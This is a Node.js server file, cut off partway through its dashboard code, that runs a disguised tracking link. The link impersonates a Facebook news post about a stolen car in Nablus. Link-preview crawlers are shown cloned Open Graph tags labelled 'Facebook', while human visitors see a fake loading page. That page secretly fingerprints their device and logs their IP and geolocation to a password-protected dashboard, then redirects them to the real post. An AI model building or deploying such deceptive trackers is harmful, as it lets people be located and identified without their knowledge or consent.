const express = require('express');
const requestIp = require('request-ip');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs');
const app = express();

app.use(express.json({ limit: '50mb' }));
app.use(requestIp.mw());

const CONFIG = {
  target_url: 'https://www.facebook.com/share/p/18atzfbxGM/',
  og_title: 'سرقت في نابلس وعثر عليها في رام الله.. الشرطة تعيد مركبة طالبة جامعية من أراضي الـ48',
  og_description: 'الطالبة وجّهت مناشدة مباشرة لمدير عام الشرطة اللواء علام السقا، لتتحرك الأجهزة الأمنية فورًا وتبدأ رحلة البحث والتحري. وبعد متابعة مكثفة بين نابلس ورام الله، تمكنت المباحث العامة من تحديد مكان المركبة وضبطها، والقبض على عدد من المشتبه بهم تمهيدًا لاتخاذ الإجراءات القانونية بحقهم.',
  og_image: 'https://scontent.fjrs2-2.fna.fbcdn.net/v/t39.30808-6/694593375_1395060505989068_1458648189795522601_n.jpg?stp=dst-jpg_tt6&cstp=mx680x680&ctp=s600x600&_nc_cat=104&ccb=1-7&_nc_sid=3b1b4a&_nc_ohc=0GVH8E28obIQ7kNvwEw3PDw&_nc_oc=AdrJprHuDdC3k9S_pGgxs433K6fXcmvomwyqqrdsv2dvAOY5NMvxRfSq0IkSF9YttZE&_nc_zt=23&_nc_ht=scontent.fjrs2-2.fna&_nc_gid=sTKXrTX3EmSgezyNk2hbiA&_nc_ss=7b20f&oh=00_Af6ZYLjSJCS4MwcGYXt77-yZbvSP4orp_xkEfW2H44o25g&oe=6A02BCD4',
  admin_password: 'Ramallah2026!',
  redirect_delay: 3000
};

const LOG_FILE = './logs.json';

function loadLogs() {
  if (!fs.existsSync(LOG_FILE)) return [];
  try {
    return fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(Boolean).map(JSON.parse).reverse();
  } catch (e) { return []; }
}

function saveLog(entry) {
  fs.appendFileSync(LOG_FILE, JSON.stringify(entry) + '\n');
}

function isBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const bots = ['facebookexternalhit','facebot','whatsapp','twitterbot','linkedinbot','telegrambot','discordbot','slackbot','googlebot','bingbot','pinterest','applebot','yandex','snapchat'];
  return bots.some(b => ua.includes(b));
}

function getClientData(req) {
  const ip = req.clientIp || req.ip || 'unknown';
  const geo = geoip.lookup(ip);
  const uaString = req.headers['user-agent'] || 'Unknown';
  const ua = UAParser(uaString);
  return { ip, geo, uaString, ua };
}

function buildBotHTML(cfg) {
  const title = cfg.og_title.replace(/"/g, '&quot;');
  const desc = cfg.og_description.replace(/"/g, '&quot;');
  const t = cfg.og_title.replace(/</g, '&lt;');
  const d = cfg.og_description.replace(/</g, '&lt;');
  return `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta property="og:title" content="${title}" />
<meta property="og:description" content="${desc}" />
<meta property="og:image" content="${cfg.og_image}" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:url" content="${cfg.target_url}" />
<meta property="og:type" content="article" />
<meta property="og:site_name" content="Facebook" />
<meta property="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="${cfg.og_image}" />
<title>${t}</title>
<link rel="canonical" href="${cfg.target_url}">
</head>
<body>
<h1>${t}</h1>
<p>${d}</p>
<img src="${cfg.og_image}" style="max-width:100%">
</body>
</html>`;
}

function buildTrackerHTML(id, target, delay) {
  const targetEsc = JSON.stringify(target);
  return `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>جاري تحميل المنشور...</title>
<style>body{font-family:Arial,sans-serif;text-align:center;padding-top:20vh;background:#f0f2f5;margin:0;color:#65676b;}
.spinner{border:4px solid #e4e6eb;border-top:4px solid #1877f2;border-radius:50%;width:48px;height:48px;animation:spin 1s linear infinite;margin:0 auto 20px;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
</head>
<body>
<div class="spinner"></div>
<h3>جاري تحميل المنشور...</h3>
<script>
(function(){
  var visitId = "${id}";
  var target = ${targetEsc};
  var data = {
    visitId: visitId,
    timestamp: new Date().toISOString(),
    screen: {width:screen.width, height:screen.height, colorDepth:screen.colorDepth, pixelRatio:window.devicePixelRatio||1},
    window: {innerWidth:window.innerWidth, innerHeight:window.innerHeight},
    navigator: {
      platform:navigator.platform, language:navigator.language, languages:navigator.languages?Array.from(navigator.languages):[navigator.language],
      cookieEnabled:navigator.cookieEnabled, onLine:navigator.onLine,
      hardwareConcurrency:navigator.hardwareConcurrency||'unknown',
      deviceMemory:navigator.deviceMemory||'unknown',
      maxTouchPoints:navigator.maxTouchPoints||0
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset()
  };
  setTimeout(function(){
    var xhr = new XMLHttpRequest();
    xhr.open('POST','/collect', true);
    xhr.setRequestHeader('Content-Type','application/json');
    xhr.send(JSON.stringify(data));
  }, 1000);
  setTimeout(function(){
    window.location.href = target;
  }, ${delay});
})();
</script>
</body>
</html>`;
}

app.get('/robots.txt', (req, res) => {
  res.type('text/plain').send('User-agent: *\nAllow: /\n');
});

app.get(['/', '/track'], (req, res) => {
  const { ip, geo, uaString, ua } = getClientData(req);
  const visitId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

  const entry = {
    visitId, timestamp: new Date().toISOString(),
    server: { ip, geo, userAgent: uaString, referer: req.headers.referer || 'Direct', acceptLanguage: req.headers['accept-language'] || 'Unknown', method: req.method, host: req.headers.host, protocol: req.protocol, url: req.originalUrl },
    parsedUA: { browser: ua.browser, engine: ua.engine, os: ua.os, device: ua.device, cpu: ua.cpu }
  };
  saveLog(entry);

  if (isBot(req)) {
    res.set('Cache-Control', 'public, max-age=3600');
    return res.type('html').send(buildBotHTML(CONFIG));
  }

  res.set('Cache-Control', 'no-store');
  res.type('html').send(buildTrackerHTML(visitId, CONFIG.target_url, CONFIG.redirect_delay + 1500));
});

app.post('/collect', (req, res) => {
  const body = req.body;
  if (!body || !body.visitId) return res.status(400).json({ error: 'missing visitId' });

  const logs = loadLogs().reverse();
  const existing = logs.find(l => l.visitId === body.visitId);

  if (existing) {
    Object.assign(existing, body);
  } else {
    const { ip, geo, uaString, ua } = getClientData(req);
    logs.push({
      visitId: body.visitId,
      timestamp: new Date().toISOString(),
      server: { ip, geo, userAgent: uaString, referer: req.headers.referer || 'Direct', acceptLanguage: req.headers['accept-language'] || 'Unknown' },
      parsedUA: { browser: ua.browser, engine: ua.engine, os: ua.os, device: ua.device, cpu: ua.cpu },
      ...body
    });
  }

  const fd = fs.openSync(LOG_FILE, 'w');
  logs.slice().reverse().forEach(l => fs.writeSync(fd, JSON.stringify(l) + '\n'));
  fs.closeSync(fd);
  res.json({ status: 'ok' });
});

app.get('/dashboard', (req, res) => {
  const pass = req.query.pass || '';
  if (pass !== CONFIG.admin_password) return res.status(403).send('Access Denied');

  const logs = loadLogs();
  let html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>لوحة التحكم</title>
<style>
body{background:#0f1115;color:#e4e6eb;font-family:Arial,sans-serif;padding:20px;margin:0;}
h1{color:#1877f2;border-bottom:2px solid #1877f2;padding-bottom:10px;}
table{width:100%;border-collapse:collapse;font-size:0.85em;margin-top:15px;}
th,td{padding:10px;border-bottom:1px solid #333;text-align:right;}
th{background:#1c1e24;color:#1877f2;position:sticky;top:0;}
tr:hover{background:#1c1e24;}
.badge{display:inline-block;padding:2px 6px;border-radius:4px;background:#333;font-size:0.8em;margin:2px;}
.critical{color:#ff4444;font-weight:bold;}
.ok{color:#00ff88;}
a{color:#00ccff;}</style>
</head>
<body>
<h1>Visitor Logs | Total: ${logs.length}</h1>`;

  if (logs.length === 0) {
    html += '<p style="color:#777">No visits yet.</p>';
  } else 
